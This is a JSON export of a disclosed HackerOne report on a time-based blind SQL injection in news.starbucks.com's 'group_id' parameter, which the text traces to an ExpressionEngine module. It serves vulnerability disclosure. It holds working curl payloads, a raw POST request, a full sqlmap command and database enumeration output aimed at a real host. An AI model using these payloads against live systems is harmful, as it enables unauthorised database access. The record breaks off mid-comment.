{"id":198292,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTgyOTI=","url":"https://hackerone.com/reports/198292","title":"Time-based Blind SQLi on news.starbucks.com","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-01-14T04:52:15.129Z","submitted_at":"2017-01-14T04:52:15.129Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"toctou","url":"/toctou","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-02-24T19:47:12.100Z","bug_reporter_agreed_on_going_public_at":"2017-01-26T18:48:13.747Z","team_member_agreed_on_going_public_at":"2017-02-24T19:47:12.051Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI just found that the post parameter \"group_id\" for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization.\n\nPoC:\n```\nPOST / HTTP/1.1\nHost: news.starbucks.com\nConnection: close\nContent-Length: 81\nCache-Control: max-age=0\nOrigin: https://news.starbucks.com\nContent-Type: application/x-www-form-urlencoded\n\nACT=55\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\n```\n\nThis query will result in an execution of a SLEEP command, delaying the server response time:\n```\ntime curl --data \"ACT=55\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m4.945s\nuser\t0m0.000s\nsys\t\t0m0.063s\n```\n\nIf the custom IF statement evaluates to False, the response would be sensibly faster:\n```\ntime curl --data \"ACT=55\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m0.860s\nuser\t0m0.000s\nsys\t\t0m0.031s\n```\n\nIn this way it was possible to detect the dbms version being 5:\n```\ntime curl --data \"ACT=55\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m4.945s\n\ntime curl --data \"ACT=55\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m1.005s\n```","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI just found that the post parameter \u0026quot;group_id\u0026quot; for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization.\u003c/p\u003e\n\n\u003cp\u003ePoC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST / HTTP/1.1\nHost: news.starbucks.com\nConnection: close\nContent-Length: 81\nCache-Control: max-age=0\nOrigin: https://news.starbucks.com\nContent-Type: application/x-www-form-urlencoded\n\nACT=55\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39;-IF(1=1,SLEEP(1),0) AND group_id=\u0026#39;1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis query will result in an execution of a SLEEP command, delaying the server response time:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003etime curl --data \u0026quot;ACT=55\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39;-IF(1=1,SLEEP(1),0) AND group_id=\u0026#39;1\u0026quot; https://news.starbucks.com\n\nreal    0m4.945s\nuser    0m0.000s\nsys     0m0.063s\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf the custom IF statement evaluates to False, the response would be sensibly faster:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003etime curl --data \u0026quot;ACT=55\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39;-IF(1=2,SLEEP(1),0) AND group_id=\u0026#39;1\u0026quot; https://news.starbucks.com\n\nreal    0m0.860s\nuser    0m0.000s\nsys     0m0.031s\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn this way it was possible to detect the dbms version being 5:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003etime curl --data \u0026quot;ACT=55\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39;-IF(MID(VERSION(),1,1)=\u0026#39;5\u0026#39;,SLEEP(1),0) AND group_id=\u0026#39;1\u0026quot; https://news.starbucks.com\n\nreal    0m4.945s\n\ntime curl --data \u0026quot;ACT=55\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39;-IF(MID(VERSION(),1,1)=\u0026#39;4\u0026#39;,SLEEP(1),0) AND group_id=\u0026#39;1\u0026quot; https://news.starbucks.com\n\nreal    0m1.005s\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-02-25T18:48:13.794Z","allow_singular_disclosure_after":-121169052.24366207,"singular_disclosure_allowed":true,"vote_count":32,"voters":["delimitry","fritzo","tk0","gerben_javado","fillawful","samux","meals","hackerhero","skansing","icanthack","and 22 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":12995,"asset_type":"OTHER","asset_identifier":"Other assets","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1420076,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @toctou thank you for the report. We are reviewing this internally and will follow with an update soon. \n\nThank you,\n@rockyrobot ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/toctou\"\u003e@toctou\u003c/a\u003e thank you for the report. We are reviewing this internally and will follow with an update soon. \u003c/p\u003e\n\n\u003cp\u003eThank you,\u003cbr\u003e\n\u003ca href=\"/rockyrobot\"\u003e@rockyrobot\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-14T06:20:13.013Z","updated_at":"2017-01-14T06:20:13.013Z","actor":{"username":"rockyrobot","cleared":false,"url":"/rockyrobot","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/112/256/061431018bdae2144e25297602c95722e8f2beed_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1439166,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @toctou,\n\nThanks for the report. I `could not reproduce` the time delay at my side as all the results were returned with negligible delay. Is there a way that you could inject more time lag (say 5 seconds) for observing noticeable time lag? I suspect that all the requests generated error message at the web server without even reaching the database.\n\nThanks,\n@verona ","markdown_message":"\u003cp\u003eHello \u003ca href=\"/toctou\"\u003e@toctou\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for the report. I \u003ccode\u003ecould not reproduce\u003c/code\u003e the time delay at my side as all the results were returned with negligible delay. Is there a way that you could inject more time lag (say 5 seconds) for observing noticeable time lag? I suspect that all the requests generated error message at the web server without even reaching the database.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\n\u003ca href=\"/verona\"\u003e@verona\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-23T19:50:47.970Z","updated_at":"2017-01-23T19:50:47.970Z","actor":{"username":"verona","cleared":false,"url":"/verona","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/077/022/43063bc1ec0e6b58d6fed4587f9a16b95a98a916_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1439515,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @verona, thanks for your reply.\n\nI've investigated a bit and it seems that the function endpoint being exposed is now for some reason moved from \"ACT=55\" to \"ACT=158\", so your PoC is now the following:\n```\nPOST / HTTP/1.1\nHost: news.starbucks.com\nConnection: close\nContent-Length: 81\nCache-Control: max-age=0\nOrigin: https://news.starbucks.com\nContent-Type: application/x-www-form-urlencoded\n\nACT=158\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\n```\n\nAs a further proof, with this vulnerabilityI've managed to extract the database names with sqlmap:\n```\nsqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:\n---\nParameter: group_id (POST)\n    Type: AND/OR time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind\n    Payload: ACT=55\u0026jsontree={x: 1}\u0026site_id=1\u0026group_id=1' AND SLEEP(5) AND 'zxkh'='zxkh\n---\nweb application technology: Apache, PHP 5.5.31\nback-end DBMS: MySQL \u003e= 5.0.0\navailable databases [5]:\n[*] cms\n[*] infq\n[*] mysql\n[*] performance_schema\n[*] test\n```\nthe problem seems to be reside in the core module file of the component NDG Flexible Admin for your ExpressionEngine implementation: in particular at the function `ajax_save_tree()`:\n```\n$results = $this-\u003eEE-\u003edb-\u003equery(\"SELECT group_id FROM \".$this-\u003eEE-\u003edb-\u003edbprefix('ndg_flexible_admin_menus').\" WHERE group_id = '\".$group_id.\"'\");\n```\nwhere the parameter `$group_id` is not being sanitized before being inserted into the query, so being exposed to this kind of vulnerability.\n\n\u0026nbsp;\nLet me know if you need some more information,\nthanks for your time,\n@toctou","markdown_message":"\u003cp\u003eHi \u003ca href=\"/verona\"\u003e@verona\u003c/a\u003e, thanks for your reply.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve investigated a bit and it seems that the function endpoint being exposed is now for some reason moved from \u0026quot;ACT=55\u0026quot; to \u0026quot;ACT=158\u0026quot;, so your PoC is now the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST / HTTP/1.1\nHost: news.starbucks.com\nConnection: close\nContent-Length: 81\nCache-Control: max-age=0\nOrigin: https://news.starbucks.com\nContent-Type: application/x-www-form-urlencoded\n\nACT=158\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39;-IF(1=1,SLEEP(1),0) AND group_id=\u0026#39;1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs a further proof, with this vulnerabilityI\u0026#39;ve managed to extract the database names with sqlmap:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:\n---\nParameter: group_id (POST)\n    Type: AND/OR time-based blind\n    Title: MySQL \u0026gt;= 5.0.12 AND time-based blind\n    Payload: ACT=55\u0026amp;jsontree={x: 1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39; AND SLEEP(5) AND \u0026#39;zxkh\u0026#39;=\u0026#39;zxkh\n---\nweb application technology: Apache, PHP 5.5.31\nback-end DBMS: MySQL \u0026gt;= 5.0.0\navailable databases [5]:\n[*] cms\n[*] infq\n[*] mysql\n[*] performance_schema\n[*] test\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethe problem seems to be reside in the core module file of the component NDG Flexible Admin for your ExpressionEngine implementation: in particular at the function \u003ccode\u003eajax_save_tree()\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$results = $this-\u0026gt;EE-\u0026gt;db-\u0026gt;query(\u0026quot;SELECT group_id FROM \u0026quot;.$this-\u0026gt;EE-\u0026gt;db-\u0026gt;dbprefix(\u0026#39;ndg_flexible_admin_menus\u0026#39;).\u0026quot; WHERE group_id = \u0026#39;\u0026quot;.$group_id.\u0026quot;\u0026#39;\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewhere the parameter \u003ccode\u003e$group_id\u003c/code\u003e is not being sanitized before being inserted into the query, so being exposed to this kind of vulnerability.\u003c/p\u003e\n\n\u003cp\u003e \u003cbr\u003e\nLet me know if you need some more information,\u003cbr\u003e\nthanks for your time,\u003cbr\u003e\n\u003ca href=\"/toctou\"\u003e@toctou\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-23T21:57:55.232Z","updated_at":"2017-01-23T21:57:55.232Z","actor":{"username":"toctou","cleared":false,"url":"/toctou","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1439999,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@toctou, Thanks for the quick response. Please clarify on below for validating the finding.\n\n1. For the first POST request, I could not noticed delay of 5 seconds when I changed from sleep(1) to sleep(5). Is there a better way to measure time delay?\n\n2. Please share the sqlmap command that revealed the database names.\n\n3. Can you provide more details on file / line number for the ajax_save_tree() function?\n\nThanks,\n@verona ","markdown_message":"\u003cp\u003e\u003ca href=\"/toctou\"\u003e@toctou\u003c/a\u003e, Thanks for the quick response. Please clarify on below for validating the finding.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eFor the first POST request, I could not noticed delay of 5 seconds when I changed from sleep(1) to sleep(5). Is there a better way to measure time delay?\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ePlease share the sqlmap command that revealed the database names.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eCan you provide more details on file / line number for the ajax_save_tree() function?\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\n\u003ca href=\"/verona\"\u003e@verona\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-24T01:26:34.679Z","updated_at":"2017-01-24T01:26:34.679Z","actor":{"username":"verona","cleared":false,"url":"/verona","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/077/022/43063bc1ec0e6b58d6fed4587f9a16b95a98a916_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1440929,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @verona, I'll reply item by item:\n\n1) When testing the PoC please check that the query is not malformed and the response from the server is `HTTP 200` and not `HTTP 500`, in the latter case it means that the dbms raised an error and it may be occur some time to re-enable accepting queries thus the measurement is not valid.\n\n1b) To correctly check the validity of the SQLi PoC I suggest to fiddle with the IF() condition being executed, thus distinghishing between the execution of the sleep command or not, rather than varying the seconds to sleep. Referring to the first PoC I submitted at the beginning of this report I think that testing with the following commands  in order would be appropriate:\n\n```\ntime curl --data \"ACT=158\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal \t0m5.079s\n```\n\n```\ntime curl --data \"ACT=158\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal \t0m0.880s\n```\n\n\u0026nbsp;\n2) The sqlmap command I used was `sqlmap.py -u \"https://news.starbucks.com\" --data=\"ACT=158\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1\" -p \"group_id\" --dbms=\"mysql\" --technique=T --dbs`\n\n\u0026nbsp;\n3) I don't have visibility on your codebase but you could be locate the row I referenced at `/expressionengine/third_party/ndg_flexible_admin/mod.ndg_flexible_admin.php` at row 150 as per this other implementation you could find online: https://searchcode.com/file/112391835/html/AppCode/expressionengine/third_party/ndg_flexible_admin/mod.ndg_flexible_admin.php\n\n\u0026nbsp;\nLet me know if I satisfied your requests,\nthanks for your time,\n@toctou","markdown_message":"\u003cp\u003eHi \u003ca href=\"/verona\"\u003e@verona\u003c/a\u003e, I\u0026#39;ll reply item by item:\u003c/p\u003e\n\n\u003cp\u003e1) When testing the PoC please check that the query is not malformed and the response from the server is \u003ccode\u003eHTTP 200\u003c/code\u003e and not \u003ccode\u003eHTTP 500\u003c/code\u003e, in the latter case it means that the dbms raised an error and it may be occur some time to re-enable accepting queries thus the measurement is not valid.\u003c/p\u003e\n\n\u003cp\u003e1b) To correctly check the validity of the SQLi PoC I suggest to fiddle with the IF() condition being executed, thus distinghishing between the execution of the sleep command or not, rather than varying the seconds to sleep. Referring to the first PoC I submitted at the beginning of this report I think that testing with the following commands  in order would be appropriate:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003etime curl --data \u0026quot;ACT=158\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39;-IF(1=1,SLEEP(1),0) AND group_id=\u0026#39;1\u0026quot; https://news.starbucks.com\n\nreal    0m5.079s\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003etime curl --data \u0026quot;ACT=158\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39;-IF(1=2,SLEEP(1),0) AND group_id=\u0026#39;1\u0026quot; https://news.starbucks.com\n\nreal    0m0.880s\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e \u003cbr\u003e\n2) The sqlmap command I used was \u003ccode\u003esqlmap.py -u \u0026quot;https://news.starbucks.com\u0026quot; --data=\u0026quot;ACT=158\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026quot; -p \u0026quot;group_id\u0026quot; --dbms=\u0026quot;mysql\u0026quot; --technique=T --dbs\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e \u003cbr\u003e\n3) I don\u0026#39;t have visibility on your codebase but you could be locate the row I referenced at \u003ccode\u003e/expressionengine/third_party/ndg_flexible_admin/mod.ndg_flexible_admin.php\u003c/code\u003e at row 150 as per this other implementation you could find online: \u003ca title=\"https://searchcode.com/file/112391835/html/AppCode/expressionengine/third_party/ndg_flexible_admin/mod.ndg_flexible_admin.php\" href=\"/redirect?url=https%3A%2F%2Fsearchcode.com%2Ffile%2F112391835%2Fhtml%2FAppCode%2Fexpressionengine%2Fthird_party%2Fndg_flexible_admin%2Fmod.ndg_flexible_admin.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://searchcode.com/file/112391835/html/AppCode/expressionengine/third_party/ndg_flexible_admin/mod.ndg_flexible_admin.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e \u003cbr\u003e\nLet me know if I satisfied your requests,\u003cbr\u003e\nthanks for your time,\u003cbr\u003e\n\u003ca href=\"/toctou\"\u003e@toctou\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-24T14:11:49.887Z","updated_at":"2017-01-24T14:11:49.887Z","actor":{"username":"toctou","cleared":false,"url":"/toctou","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1442011,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Update: while trying to do some more testing, it seems (pure speculation here) that sqlmap triggers some sort of WAF that relocates the \"ACT\" functions mapping, so it appears that \"ACT=158\" is no more a valid parameter to use in an attack once again.\n\nMaybe are you working on a fix?\nFor now I cannot find any valid \"ACT\" parameter value which brings to the vulnerable php function, so all previous PoCs are of no use. I'll keep you updated in case I'll find one, in the meantime let me know if the informations I've provided are enough.","markdown_message":"\u003cp\u003eUpdate: while trying to do some more testing, it seems (pure speculation here) that sqlmap triggers some sort of WAF that relocates the \u0026quot;ACT\u0026quot; functions mapping, so it appears that \u0026quot;ACT=158\u0026quot; is no more a valid parameter to use in an attack once again.\u003c/p\u003e\n\n\u003cp\u003eMaybe are you working on a fix?\u003cbr\u003e\nFor now I cannot find any valid \u0026quot;ACT\u0026quot; parameter value which brings to the vulnerable php function, so all previous PoCs are of no use. I\u0026#39;ll keep you updated in case I\u0026#39;ll find one, in the meantime let me know if the informations I\u0026#39;ve provided are enough.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-24T21:52:54.267Z","updated_at":"2017-01-24T21:55:07.303Z","actor":{"username":"toctou","cleared":false,"url":"/toctou","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1442021,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"@toctou, Thank you for the clarification.\n\n1. I still did not see much difference in execution times of queries. Can you explain what - operator before IF? Is it for subtraction?\n\n`time curl --data \"ACT=158\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com`\n\n`real    0m0.516s`\n\n`time curl --data \"ACT=158\u0026jsontree={\"x\":1}\u0026site_id=1\u0026group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com`\n\n`real    0m0.498s`\n\n2. I am notifying the risk to news.starbuckscom team based on the identified databases by the sqlmap command.\n\nPlease note that we won't be able to offer bounty on this one as this site is not listed in our `Targets Eligible For Reward`. However, you could gain reputation points on H1 after the team resolves it.\n\nThanks,\n@verona \n\n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/toctou\"\u003e@toctou\u003c/a\u003e, Thank you for the clarification.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eI still did not see much difference in execution times of queries. Can you explain what - operator before IF? Is it for subtraction?\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003ccode\u003etime curl --data \u0026quot;ACT=158\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39;-IF(1=1,SLEEP(1),0) AND group_id=\u0026#39;1\u0026quot; https://news.starbucks.com\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ereal    0m0.516s\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003etime curl --data \u0026quot;ACT=158\u0026amp;jsontree={\u0026quot;x\u0026quot;:1}\u0026amp;site_id=1\u0026amp;group_id=1\u0026#39;-IF(1=2,SLEEP(1),0) AND group_id=\u0026#39;1\u0026quot; https://news.starbucks.com\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ereal    0m0.498s\u003c/code\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eI am notifying the risk to news.starbuckscom team based on the identified databases by the sqlmap command.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003ePlease note that we won\u0026#39;t be able to offer bounty on this one as this site is not listed in our \u003ccode\u003eTargets Eligible For Reward\u003c/code\u003e. However, you could gain reputation points on H1 after the team resolves it.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\n\u003ca href=\"/verona\"\u003e@verona\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-24T22:00:08.003Z","updated_at":"2017-01-24T22:00:08.003Z","actor":{"username":"verona","cleared":false,"url":"/verona","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/077/022/43063bc1ec0e6b58d6fed4587f9a16b95a98a916_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1442064,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, @verona, thanks for the quick reply.\n\nAs I just said, any PoC is now unavailable as the URL with \"ACT=158\" is no more valid. Before my last message of some minutes ago you could have experienced 4/5 seconds of difference.\n\nFor the query, I just made up a quick test (I could have done better), and what you see is indeed a minus.\nIt have some abuse of notation, but it executes correctly: the SLEEP function always return value '0', so in the first case (`1=1`=`True`) it is equivalent of `group_id=1-0` with a delay of `1 second` as side effect (or more, it depends on how it all executes \"under the hood\"); \nin the second case (`1=2`=`False`) it is equivalent of `group_id=1-0` without any delay.\n\nLastly, I've informedly submitted this report knowing that it is out of scope, I just wanted to close an important bug for the sake of it (and gain some useful reputation of course!).\n\nThanks for reporting to the team, looking forward to see a reply.\n@toctou","markdown_message":"\u003cp\u003eHi, \u003ca href=\"/verona\"\u003e@verona\u003c/a\u003e, thanks for the quick reply.\u003c/p\u003e\n\n\u003cp\u003eAs I just said, any PoC is now unavailable as the URL with \u0026quot;ACT=158\u0026quot; is no more valid. Before my last message of some minutes ago you could have experienced 4/5 seconds of difference.\u003c/p\u003e\n\n\u003cp\u003eFor the query, I just made up a quick test (I could have done better), and what you see is indeed a minus.\u003cbr\u003e\nIt have some abuse of notation, but it executes correctly: the SLEEP function always return value \u0026#39;0\u0026#39;, so in the first case (\u003ccode\u003e1=1\u003c/code\u003e=\u003ccode\u003eTrue\u003c/code\u003e) it is equivalent of \u003ccode\u003egroup_id=1-0\u003c/code\u003e with a delay of \u003ccode\u003e1 second\u003c/code\u003e as side effect (or more, it depends on how it all executes \u0026quot;under the hood\u0026quot;); \u003cbr\u003e\nin the second case (\u003ccode\u003e1=2\u003c/code\u003e=\u003ccode\u003eFalse\u003c/code\u003e) it is equivalent of \u003ccode\u003egroup_id=1-0\u003c/code\u003e without any delay.\u003c/p\u003e\n\n\u003cp\u003eLastly, I\u0026#39;ve informedly submitted this report knowing that it is out of scope, I just wanted to close an important bug for the sake of it (and gain some useful reputation of course!).\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting to the team, looking forward to see a reply.\u003cbr\u003e\n\u003ca href=\"/toctou\"\u003e@toctou\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-24T22:24:29.056Z","updated_at":"2017-01-24T22:24:29.056Z","actor":{"username":"toctou","cleared":false,"url":"/toctou","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/279/f50689306c5f4971d18641697f23118b0f0ce910_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1443921,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@toctou, news.starbucks.com mentioned that this risk is fixed as they added some validations. Can you please validate?","markdown_message":"\u003cp\u003e\u003ca href=\"/toctou\"\u003e@toctou\u003c/a\u003e, news.starbucks.com mentioned that this risk is fixed as they added some validations. Can you please 